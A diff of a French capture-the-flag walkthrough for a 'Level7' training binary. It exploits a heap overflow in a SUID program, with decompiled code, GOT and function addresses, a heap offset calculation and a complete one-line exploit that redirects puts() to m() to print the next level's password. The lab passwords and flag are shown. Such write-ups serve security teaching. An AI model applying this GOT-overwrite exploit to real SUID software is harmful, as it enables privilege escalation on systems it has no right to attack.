@@ -1,28 +1,25 @@
 # Level7 - Walkthrough
 
 ## Objectif
-Utiliser un heap buffer overflow pour overwriter un pointeur de fonction et rediriger `puts()` vers `m()`, qui affiche la variable globale `c` contenant le flag.
+Exploiter un heap buffer overflow avec double indirection pour écrire l'adresse de `m()` dans la GOT de `puts()` et afficher le flag.
+
+**Technique** : Heap Overflow + GOT Overwrite via Double Indirection
 
 ---
 
-## Étape 1 : Connexion
+## Étapes d'exploitation
 
-```bash
-ssh level7@localhost -p 4242
-# Mot de passe : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
-```
-
----
-
-## Étape 2 : Reconnaissance
-
+### 1. Reconnaissance
 ```bash
 ls -la
+# -rwsr-s---+ 1 level8 users  5648 Mar  6  2016 level7
+# ⚠️ Bit SUID actif → s'exécute avec les droits de level8
+
 ./level7
-# Segmentation fault (sans arguments)
+# Segmentation fault
 
 ./level7 test
-# Segmentation fault (1 seul argument)
+# Segmentation fault
 
 ./level7 test arg2
 # ~~
@@ -30,135 +27,104 @@ ls -la
 
 Le programme nécessite **2 arguments**.
 
----
-
-## Étape 3 : Identifier la vulnérabilité
-
-Analyser le binaire dans Ghidra :
+### 2. Analyse du code (Ghidra)
 
 ```c
-undefined4 main(undefined4 param_1, int param_2)
-{
-  undefined4 *puVar1;
-  void *pvVar2;
-  undefined4 *puVar3;
-  FILE *__stream;
-  
-  puVar1 = malloc(8);                       // Struct A: [value][pointer]
-  *puVar1 = 1;
-  pvVar2 = malloc(8);                       // Buffer A
-  puVar1[1] = pvVar2;                       // Struct A.pointer → Buffer A
-  
-  puVar3 = malloc(8);                       // Struct B: [value][pointer]
-  *puVar3 = 2;
-  pvVar2 = malloc(8);                       // Buffer B
-  puVar3[1] = pvVar2;                       // Struct B.pointer → Buffer B
-  
-  strcpy((char *)puVar1[1], *(char **)(param_2 + 4));   // argv[1] → Buffer A
-  strcpy((char *)puVar3[1], *(char **)(param_2 + 8));   // argv[2] → Buffer B
-  
-  __stream = fopen("/home/user/level8/.pass", "r");
-  fgets(c, 0x44, __stream);                 // Lit le flag dans c
-  puts("~~");
-  return 0;
+char c[68];  // Variable globale
+
+void m(void) {
+    printf("%s - %d\n", c, time(NULL));  // Affiche le flag !
 }
 
-void m(void *param_1, int param_2, char *param_3, int param_4, int param_5)
-{
-  time_t tVar1 = time((time_t *)0x0);
-  printf("%s - %d\n", c, tVar1);            // Affiche le flag !
-  return;
+int main(int argc, char **argv) {
+    int *struct_a = malloc(8);
+    struct_a[0] = 1;
+    void *buffer_a = malloc(8);
+    struct_a[1] = buffer_a;      // struct_a[1] pointe vers buffer_a
+
+    int *struct_b = malloc(8);
+    struct_b[0] = 2;
+    void *buffer_b = malloc(8);
+    struct_b[1] = buffer_b;      // struct_b[1] pointe vers buffer_b
+
+    strcpy(struct_a[1], argv[1]);  // ⚠️ Overflow possible
+    strcpy(struct_b[1], argv[2]);  // ⚠️ Écrit où struct_b[1] pointe
+
+    FILE *file = fopen("/home/user/level8/.pass", "r");
+    fgets(c, 68, file);            // Lit le flag dans c
+    puts("~~");                    // ← On va détourner ça vers m()
 }
 ```
 
-**La vulnérabilité :** Deux `strcpy()` sans limite sur le heap.
+**Stratégie** :
+1. Overflow buffer_a → écrase struct_b[1] avec l'adresse GOT de puts
+2. strcpy(struct_b[1], argv[2]) écrit argv[2] dans GOT[puts]
+3. puts("~~") appelle m() à la place → m() affiche c
 
-**La stratégie :**
-1. Overwriter le pointeur de Struct B avec l'adresse de `puts()` GOT
-2. Écrire l'adresse de `m()` à cette adresse GOT
-3. Quand `puts("~~")` s'exécute, ça appelle `m()` au lieu de `puts()`
-4. `m()` affiche le flag stocké dans la variable globale `c`
+### 3. Trouver les adresses critiques
 
----
-
-## Étape 4 : Trouver les adresses critiques
-
-### Adresse de `m()`
-
+#### Adresse de `m()`
 ```bash
-objdump -t level7 | grep " m"
+objdump -t level7 | grep " m$"
+# 080484f4 g     F .text  m
 ```
 
-Résultat : `0x080484f4`
-
-### Adresse de `puts()` dans la GOT
-
+#### Adresse de `puts()` dans la GOT
 ```bash
 objdump -R level7 | grep puts
+# 08049928 R_386_JUMP_SLOT   puts
 ```
 
-Résultat : `0x08049928`
+### 4. Calculer l'offset
 
-### Adresse de la variable globale `c`
-
-```bash
-objdump -t level7 | grep " c"
+**Layout du heap** :
+```
+0x0804a018  Buffer A (8 bytes)        ← strcpy(argv[1]) écrit ici
+0x0804a020  Header Struct B (8 bytes)
+0x0804a028  struct_b[0] (4 bytes)
+0x0804a02c  struct_b[1] (4 bytes)     ← CIBLE !
 ```
 
-Résultat : `0x08049960`
+**Offset = 20 bytes** (8 + 8 + 4)
 
----
+### 5. Construction des payloads
 
-## Étape 5 : Trouver l'offset du heap overflow
+#### Payload argv[1] : Préparer la cible
+```
+"A" × 20 + adresse_GOT_puts
 
-Tester progressivement :
+Conversion little-endian :
+0x08049928 → \x28\x99\x04\x08
 
-```bash
-./level7 $(python -c 'print "A"*16 + "BBBB"') CCCC
-# ~~  (fonctionne)
-
-./level7 $(python -c 'print "A"*17 + "BBBB"') CCCC
-# Segmentation fault
-
-./level7 $(python -c 'print "A"*20 + "BBBB"') CCCC
-# ~~  (fonctionne correctement)
+Commande :
+python -c 'print "A"*20 + "\x28\x99\x04\x08"'
 ```
 
-**L'offset est 20 bytes** (pour overwriter correctement le pointeur de Struct B).
+**Effet** : struct_b[1] = 0x08049928 (GOT de puts)
 
----
-
-## Étape 6 : Construction du payload
-
-Structure :
-- `A` * 20 = Remplit Buffer A et overflow jusqu'au pointeur de Struct B
-- `\x28\x99\x04\x08` = Adresse de `puts()` GOT en little-endian (écrase le pointeur)
-
-Payload argv[1] :
-```bash
-python -c 'print "A" * 20 + "\x28\x99\x04\x08"'
+#### Payload argv[2] : Écrire dans la GOT
 ```
+adresse_de_m()
 
-Payload argv[2] :
-```bash
+Conversion little-endian :
+0x080484f4 → \xf4\x84\x04\x08
+
+Commande :
 python -c 'print "\xf4\x84\x04\x08"'
 ```
 
-Cette deuxième payload écrit l'adresse de `m()` à l'adresse de `puts()` GOT.
+**Effet** : GOT[puts] = 0x080484f4 (adresse de m())
 
----
-
-## Étape 7 : Exploitation
+### 6. Exploitation
 
 ```bash
-./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
 ```
 
-Résultat : `m()` s'exécute, affiche le flag avec le timestamp.
+**Résultat** : Le flag s'affiche avec un timestamp.
 
-```bash
-su level8
-# Mot de passe : 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+```
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 - 1711234567
 ```
 
 ---
@@ -167,3 +133,9 @@ su level8
 ```
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 ```
+
+## Type de vulnérabilité
+- Heap-based Buffer Overflow (CWE-122)
+- Write-what-where Condition (CWE-123)
+- GOT Overwrite via Double Indirection
+- SUID privilege escalation (CWE-250)
